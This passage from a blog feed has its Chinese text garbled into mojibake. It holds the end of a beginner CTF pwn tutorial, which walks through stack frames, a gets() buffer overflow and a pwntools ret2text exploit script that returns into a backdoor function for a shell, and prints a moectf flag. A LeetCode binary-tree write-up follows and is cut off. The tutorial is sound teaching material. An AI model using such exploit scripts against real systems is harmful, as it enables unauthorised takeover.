ˆï¼š</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šåœ¨å†…å­˜å½“ä¸­ï¼Œæ ˆæ˜¯ç”±é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘å¢é•¿çš„</strong></p><p><img src="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png" alt="64E3FCC73EF02703BA8C857A91F96838.png"></p><p>è¿™é‡Œå¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µâ€”â€”<strong>æ ˆæŒ‡é’ˆå¯„å­˜å™¨SP</strong>ï¼ˆ<strong>Stack Pointer</strong>ï¼‰ä¸<strong>å¸§æŒ‡é’ˆå¯„å­˜å™¨BP</strong>ï¼ˆ<strong>Frame Pointer</strong>ï¼‰ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨ç”¨ä»¥ç®¡ç†æ ˆå¸§ï¼Œå…¶ä¸­<strong>SPå¯„å­˜å™¨æ°¸è¿œæŒ‡å‘æ ˆé¡¶ï¼ŒBPå¯„å­˜å™¨ç”¨ä»¥è¿›è¡Œå¯¹æ ˆå†…æ•°æ®çš„è®¿é—®</strong></p><p>å½“æˆ‘ä»¬è¦è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œé¦–å…ˆä¼šå…ˆ<strong>å°†ä¸‹ä¸€æ¡çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œä½œä¸ºè¿”å›åœ°å€ï¼Œè¿™ä¸€æ­¥åœ¨åŸå‡½æ•°å†…å®Œæˆ</strong>ï¼Œå½“å‡½æ•°æ‰§è¡Œæµç¨‹ç»“æŸåï¼Œç¨‹åºä¼šé€šè¿‡è¿™ä¸ªè¿”å›åœ°å€è¿”å›åˆ°è¯¥å‡½æ•°çš„ä¸Šä¸€å±‚çš„è°ƒç”¨åœ°å€</p><p>æˆ‘ä»¬è¿˜æ˜¯ä»¥åˆšåˆšåæ±‡ç¼–å‡ºæ¥çš„ä»£ç è¿›è¡Œåˆ†æï¼š</p><p>å³é”®èœå•å¯ä»¥åˆ‡æ¢åˆ°æ–‡æœ¬æ¨¡å¼ï¼Œä¹Ÿå¯ä»¥åˆ‡æ¢å›å›¾æ ‡æ ¼å¼ï¼Œæ–‡æœ¬æ¨¡å¼æ–¹ä¾¿æˆ‘ä»¬å¾—ä»¥ä¸€çª¥ç¨‹åºåŸè²Œï¼Œå›¾æ ‡æ¨¡å¼åˆ™æ–¹ä¾¿æˆ‘ä»¬ç†è§£å‡½æ•°å†…çš„é€»è¾‘</p><p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4â†“p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          = byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; // starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png" alt="52DF40089C8FCCF9D5CF8DE7211B73D8.png"></p><p>æ¥ä¸‹æ¥å°±æ¥åˆ°äº†æˆ‘ä»¬çœ‹åˆ°çš„å‰ä¸¤è¡Œæ±‡ç¼–ä»£ç ï¼š<code>push rbp</code>ä¸<code>mov rbp, rsp</code>ï¼Œæˆ‘ä»¬ä¸éš¾ä»æŒ‡ä»¤çš„è‹±æ–‡é‡Šä¹‰ä¸ŠçŸ¥é“å…¶æµç¨‹ï¼š</p><ul><li><strong>å°†bpå¯„å­˜å™¨çš„å€¼å‹å…¥æ ˆä¸­</strong></li><li><strong>å°†spå¯„å­˜å™¨çš„å€¼èµ‹ç»™bpå¯„å­˜å™¨</strong></li></ul><p><img src="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png" alt="9CF0F7F5A8DA1972F88EF480E4FB6271.png"></p><p>æ¥ä¸‹æ¥çš„<code>sub rsp, 20h</code>æŒ‡ä»¤çš„ä½œç”¨æ˜¯<strong>å¼€è¾Ÿæ ˆç©ºé—´</strong>ï¼Œå¤„åœ¨spä¸bpä¹‹é—´çš„è¿™ä¸€å—åŒºåŸŸä¾¿ç”¨äºå‚¨å­˜æ•°æ®</p><p><img src="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png" alt="A422C008B65723152D16FDDAD8421B38.png"></p><p>æˆ‘ä»¬çš„<code>char str[20];</code>æ‰€å ç”¨çš„ç©ºé—´ä¹Ÿåœ¨è¿™é‡Œï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬<strong>è™½ç„¶åªåˆ†é…äº†20ä¸ªå­—èŠ‚ç»™strï¼Œä½†æ˜¯ç¨‹åºå´å¼€è¾Ÿäº†0x20ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œè¿™æ˜¯å› ä¸ºç¨‹åºè¿˜è¦å‚¨å­˜ä¸€äº›å…¶ä»–çš„æ•°æ®</strong>ï¼ˆä»¥åä¼šå­¦åˆ°ï¼‰</p><p><img src="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png" alt="227643CB6A805274DA147132CC0413DE.png"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¿›å…¥åˆ°æˆ‘ä»¬å¯¹<code>gets()</code>å‡½æ•°çš„æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹äº†ï¼Œç”±äºå…¶ä¸é™åˆ¶æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥<strong>å°†è¿”å›åœ°å€å‰é¢çš„æ•°æ®å…¨éƒ¨å¡«å……</strong>ï¼ˆ<strong>padding</strong>ï¼‰<strong>æ‰ï¼Œå¹¶å°†è¿”å›åœ°å€è¦†å†™ä¸ºåˆ«çš„åœ°å€ï¼Œæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµç¨‹</strong></p><p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p><p>æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯<strong>è·å–åˆ°shell</strong>ï¼Œé‚£ä¹ˆåªè¦ç¨‹åºå½“ä¸­å­˜åœ¨ç€<code>system(&quot;/bin/sh&quot;)</code>çš„å‡½æ•°è°ƒç”¨ï¼Œæˆ‘ä»¬å†å°†ç¨‹åºè¿”å›åˆ°å…¶åœ°å€ä¸Šï¼Œå³å¯get shell</p><p>æ„é€ payloadå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)<span class="comment"># åˆ«å¿˜äº†8å­—èŠ‚çš„rbpå“Ÿ</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹‹å‰åœ¨ç¨‹åºå½“ä¸­å†™äº†ä¸€ä¸ª<code>backdoor()</code>å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«æœ‰èƒ½å¤Ÿgetshellçš„è¯­å¥ï¼ŒåŒæ—¶æˆ‘ä»¬åœ¨IDAä¸­å¯ä»¥çœ‹åˆ°å…¶åœ°å€ä¸º<code>0x400547</code></p><p><img src="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png" alt="image.png"></p><h4 id="æ”»å‡»ç¥å™¨ï¼špwntools"><a href="#æ”»å‡»ç¥å™¨ï¼špwntools" class="headerlink" title="æ”»å‡»ç¥å™¨ï¼špwntools"></a>æ”»å‡»ç¥å™¨ï¼špwntools</h4><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘åˆ°å¦‚ä½•å°†æˆ‘ä»¬æ‰€æ„æ€å‡ºæ¥çš„payloadç»™è¾“å…¥åˆ°ç¨‹åºä¸­äº†ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±è¦ç”¨åˆ°ä¸€ä¸ªå¯¹äºæ¯ä¸€ä½Pwneréƒ½ååˆ†é‡è¦çš„pythonåº“â€”â€”<strong>pwntools</strong></p><blockquote><p>pwntoolséœ€è¦åœ¨<strong>Linux</strong>ç³»ç»Ÿä¸‹ä½¿ç”¨ï¼ˆå¦‚Ubuntuã€manjaroã€kaliç­‰ï¼‰</p><p>åœ¨shellä¸­è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤å®‰è£…pwntools</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo pip install pwntools</span></span><br></pre></td></tr></table></figure></blockquote><p>ä½¿ç”¨pwntoolsåº“æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¾“å…¥ç›¸åº”çš„payload</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¯¥å¼€å§‹æ„é€ æˆ‘ä»¬ç”¨ä»¥get shellçš„è„šæœ¬äº†ï¼Œåˆ©ç”¨pwntoolsåº“ï¼Œæ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># ä»pwntoolsåº“ä¸­å¯¼å…¥æ‰€éœ€è¦çš„ä¸€åˆ‡</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)<span class="comment"># è¿è¡Œä¸€ä¸ªç¨‹åº</span></span><br><span class="line"><span class="comment"># éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿æ¥è¿œç¨‹æœåŠ¡å™¨çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯remote()</span></span><br><span class="line">    <span class="comment"># p = remote(addr,port)</span></span><br><span class="line">        <span class="comment"># å¦‚ï¼šp = remote(&#x27;sec.arttnba3.cn&#x27;,10001)</span></span><br><span class="line">p.recv()<span class="comment"># ä»ç¨‹åºä¸­è¯»å–è¾“å…¥ç›´åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼ˆå¦‚é‡åˆ°è¾“å…¥è¯­å¥ï¼‰</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)<span class="comment"># å°†åœ°å€æ„é€ ä¸ºç¬¦åˆå°ç«¯æ¨¡å¼çš„bytesæ•°ç»„ï¼Œé•¿åº¦ä¸º8</span></span><br><span class="line"><span class="comment"># éœ€è¦æ³¨æ„çš„æ˜¯åœ¨32ä½ä¸‹åº”å½“ä½¿ç”¨p32()ï¼Œé•¿åº¦ä¸º4</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + sys_addr<span class="comment"># æ„é€ æˆ‘ä»¬çš„payload</span></span><br><span class="line">p.sendline(payload)<span class="comment"># å‘ç¨‹åºå‘é€æˆ‘ä»¬çš„è¾“å…¥</span></span><br><span class="line"><span class="comment"># éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œsendline()ä¼šåœ¨æœ«å°¾æ·»åŠ æ¢è¡Œç¬¦&#x27;\n&#x27;</span></span><br><span class="line">    <span class="comment"># è‹¥ä¸æƒ³è¦å‘é€å¤šä½™çš„æ¢è¡Œç¬¦ï¼Œå¯ä»¥ä½¿ç”¨send()æ–¹æ³•</span></span><br><span class="line">p.interactive()<span class="comment"># ç¨‹åºè¿›å…¥interactiveæ¨¡å¼ï¼Œå³è¿›å…¥æˆ‘ä»¬ä¸ç¨‹åºç›´æ¥äº¤äº’çš„ç•Œé¢</span></span><br></pre></td></tr></table></figure><p><strong>æˆåŠŸget shell</strong></p><p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†<strong>ä»0å¼€å§‹åˆ©ç”¨gets()å‡½æ•°çš„æ ˆæº¢å‡ºæ¼æ´è·å–æœ€é«˜æƒé™çš„æ•´ä¸ªè¿‡ç¨‹</strong>ï¼Œæ¥ä¸‹æ¥å°±è¯¥é ä½ è‡ªå·±çš„åŠªåŠ›ï¼Œå»åˆ†æã€åˆ©ç”¨æ¯ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„ç³»ç»Ÿæ¼æ´ï¼Œå¤ºå–æœ€é«˜æƒé™äº†</p><p><strong>ä¸ºäº†æ‹¥æœ‰â€œèƒ½å¤Ÿgetshellä»»æ„ä¸€å°è®¾å¤‡â€çš„èƒ½åŠ›è€ŒåŠªåŠ›å§ï¼æ–°ç”Ÿä»£çš„é»‘å®¢ä»¬ï¼</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Pwnä»å…¥é—¨åˆ°å…¥ç‹±&quot;&gt;&lt;a href=&quot;#Pwnä»å…¥é—¨åˆ°å…¥ç‹±&quot; class=&quot;headerlink&quot; title=&quot;Pwnä»å…¥é—¨åˆ°å…¥ç‹±&quot;&gt;&lt;/a&gt;Pwnä»å…¥é—¨åˆ°å…¥ç‹±&lt;/h1&gt;&lt;p&gt;Copyright Â© 2020 arttnba3,XDSEC&lt;/p&gt;
&lt;h2 id=&quot;ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ&quot;&gt;&lt;a href=&quot;#ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ&quot;&gt;&lt;/a&gt;ç®€ä»‹ï¼šä»€ä¹ˆæ˜¯Pwnï¼Ÿ&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Pwn &amp;#x2F;poÊŠn&amp;#x2F;&lt;strong&gt;è¿™ä¸ªè¯æœ¬èº«å…¶å®æ˜¯ä¸€ä¸ªæ‹Ÿå£°è¯ï¼Œæœ€åˆæ¥æºäºé»‘å®¢ä»¬è®¾æƒ³ä¸­çš„å®Œå…¨è·å–ä¸€å°è®¾å¤‡çš„æ§åˆ¶æƒåä¾¿ä¼šå‘å‡ºâ€œç °â€çš„ä¸€å£°ï¼ŒPwnå› æ­¤è€Œå¾—åï¼Œå³&lt;/strong&gt;åˆ©ç”¨æŒ–æ˜åˆ°çš„äºŒè¿›åˆ¶æ¼æ´å¯¹è®¾å¤‡æˆ–ç³»ç»Ÿå‘èµ·æ”»å‡»ï¼Œå¹¶æœ€ç»ˆæ‹¿åˆ°shellï¼ˆè·å–æ§åˆ¶æƒï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Pwnä¹Ÿæ˜¯æœ€èƒ½ä»£è¡¨&lt;strong&gt;åŸæ•™æ—¨ä¸»ä¹‰é»‘å®¢&lt;/strong&gt;çš„ä¸€ä¸ªå®‰å…¨ç ”ç©¶æ–¹å‘&lt;del&gt;åŒæ—¶ä¹Ÿæ˜¯æœ€å®¹æ˜“è¿›ç›‘ç‹±çš„ä¸€ä¸ªæ–¹å‘&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ã€OJ-0x0005-Leetcodeã€‘æ ‘éƒ¨åˆ†write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90OJ-0x0005-Leetcode%E3%80%91%E6%A0%91%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90OJ-0x0005-Leetcode%E3%80%91%E6%A0%91%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-16T19:22:48.000Z</published>
    <updated>2020-10-14T16:35:16.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>æœ¬æ¥ä¸æƒ³è¿™ä¹ˆå¿«åˆå¼€ä¸€ç¯‡æ–°çš„blogçš„ï¼ˆ<del>æ¯•ç«Ÿä¸€ç¯‡OJå°±æ˜¯ä¸€ä¸ªå‘ï¼Œå‰é¢çš„å¥½å¤šå‘æ‰åˆšåˆšå¼€æŒ–</del>ï¼‰ï¼Œä¸è¿‡å› ä¸ºåˆšå¥½åšäº†æ¯æ—¥ä¸€é¢˜çš„å‰ç½®é¢˜ç›®è€Œåˆšå¥½è¿™é“é¢˜åˆæ˜¯æ ‘&#x2F;å›¾é¢˜æ‰€ä»¥æƒ³æ‰¾ä¸ªåœ°æ–¹è®°å½•ä¸‹æ¥å› æ­¤å°±å¼€äº†ä¸€ç¯‡æ–°åšå®¢</p><p>é¢˜å¥½éš¾åšå•Š.jpg</p><span id="more"></span><h2 id="pre-ä»€ä¹ˆæ˜¯æ ‘"><a href="#pre-ä»€ä¹ˆæ˜¯æ ‘" class="headerlink" title="pre.ä»€ä¹ˆæ˜¯æ ‘"></a>pre.ä»€ä¹ˆæ˜¯æ ‘</h2><blockquote><p>æ ‘æ˜¯ä¸€ç§æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆADTï¼‰æˆ–æ˜¯å®ç°è¿™ç§æŠ½è±¡æ•°æ®ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œç”¨æ¥æ¨¡æ‹Ÿå…·æœ‰æ ‘çŠ¶ç»“æ„æ€§è´¨çš„æ•°æ®é›†åˆã€‚å®ƒæ˜¯ç”± n(n&gt;0)n(n&gt;0) ä¸ªæœ‰é™èŠ‚ç‚¹ç»„æˆä¸€ä¸ªå…·æœ‰å±‚æ¬¡å…³ç³»çš„é›†åˆã€‚</p><p><img src="https://i.loli.net/2020/09/18/X7l15qIoGtLN9hJ.png" alt="image.png"></p><p>æŠŠå®ƒå«åšã€Œæ ‘ã€æ˜¯å› ä¸ºå®ƒçœ‹èµ·æ¥åƒä¸€æ£µå€’æŒ‚çš„æ ‘ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯æ ¹æœä¸Šï¼Œè€Œå¶æœä¸‹çš„ã€‚</p><p>å®ƒå…·æœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š</p><p>æ¯ä¸ªèŠ‚ç‚¹éƒ½åªæœ‰æœ‰é™ä¸ªå­èŠ‚ç‚¹æˆ–æ— å­èŠ‚ç‚¹ï¼›<br>æ²¡æœ‰çˆ¶èŠ‚ç‚¹çš„èŠ‚ç‚¹ç§°ä¸ºæ ¹èŠ‚ç‚¹ï¼›<br>æ¯ä¸€ä¸ªéæ ¹èŠ‚ç‚¹æœ‰ä¸”åªæœ‰ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼›<br>é™¤äº†æ ¹èŠ‚ç‚¹å¤–ï¼Œæ¯ä¸ªå­èŠ‚ç‚¹å¯ä»¥åˆ†ä¸ºå¤šä¸ªä¸ç›¸äº¤çš„å­æ ‘ï¼›<br>æ ‘é‡Œé¢æ²¡æœ‰ç¯è·¯ã€‚</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/tag/tree/">https://leetcode-cn.com/tag/tree/</a><br>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>æ„é€ ä¸€æ£µ<strong>æ ‘</strong>çš„æœ€ç®€å•çš„ä»£ç å¦‚ä¸‹:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tree</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tree</span> * next;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tree</span> * child;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§ç»“æ„æ˜¯ä»¥ä¸‹å›¾çš„æ–¹å¼æ¥ä¿å­˜ä¸€æ£µæ ‘çš„ï¼š</p><p><img src="https://i.loli.net/2020/09/17/cuRZvFXGaizQsom.png" alt="image.png"></p><p>æ„é€ ä¸€æ£µ<strong>äºŒå‰æ ‘</strong>çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tree</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tree</span> * left;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tree</span> * right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ˜¯ä¸æ˜¯å¾ˆç›¸ä¼¼å‘¢ï¼Ÿå…¶å®å¯ä»¥æŠŠæ ‘çš„å›¾æ­ªè¿‡æ¥åº·åº·â€¦</p></blockquote><h1 id="0x01-éš¾åº¦ï¼šç®€å•"><a href="#0x01-éš¾åº¦ï¼šç®€å•" class="headerlink" title="0x01.éš¾åº¦ï¼šç®€å•"></a>0x01.éš¾åº¦ï¼šç®€å•</h1><h2 id="0x00-äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"><a href="#0x00-äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦" class="headerlink" title="0x00.äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"></a>0x00.<a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å¤§æ·±åº¦ã€‚</p><p>äºŒå‰æ ‘çš„æ·±åº¦ä¸ºæ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶å­èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°ã€‚</p><p>è¯´æ˜: å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚</p><p>ç¤ºä¾‹ï¼š<br>ç»™å®šäºŒå‰æ ‘ [3,9,20,null,null,15,7]ï¼Œ</p><pre><code>3</code></pre><p>   &#x2F; \<br>  9  20<br>    &#x2F;  \<br>   15   7<br>è¿”å›å®ƒçš„æœ€å¤§æ·±åº¦ 3 ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree">https://leetcode-cn.com/problems/maximum-depth-of-binary-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>æˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨<strong>é€’å½’</strong>çš„æ–¹å¼è·å–å…¶æœ€å¤§æ·±åº¦ï¼Œå³æ·±åº¦ä¼˜å…ˆæœç´¢</p><p>æ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span>&amp;&amp;root-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    i=maxDepth(root-&gt;left)+<span class="number">1</span>;</span><br><span class="line">    j=maxDepth(root-&gt;right)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> i&gt;j?i:j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œé€’å½’ä¼šå ç”¨å¤§é‡æ ˆç©ºé—´ï¼Œå› æ­¤å†…å­˜æ¶ˆè€—ä¸Šå¹¶ä¸æ˜¯é‚£ä¹ˆçš„ç†æƒ³ï¼ˆ</p><p><img src="https://i.loli.net/2020/09/17/O1CDTlZgMUpXzVw.png" alt="image.png"></p><h2 id="0x01-ç¿»è½¬äºŒå‰æ ‘"><a href="#0x01-ç¿»è½¬äºŒå‰æ ‘" class="headerlink" title="0x01.ç¿»è½¬äºŒå‰æ ‘"></a>0x01.<a href="https://leetcode-cn.com/problems/invert-binary-tree/">ç¿»è½¬äºŒå‰æ ‘</a></h2><blockquote><p>ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>è¾“å…¥ï¼š</p><pre><code> 4</code></pre><p>   &#x2F;   \<br>  2     7<br> &#x2F; \   &#x2F; \<br>1   3 6   9<br>è¾“å‡ºï¼š</p><pre><code> 4</code></pre><p>   &#x2F;   <br>  7     2<br> &#x2F; \   &#x2F; <br>9   6 3   1<br>å¤‡æ³¨:<br>è¿™ä¸ªé—®é¢˜æ˜¯å—åˆ° Max Howell çš„ åŸé—®é¢˜ å¯å‘çš„ 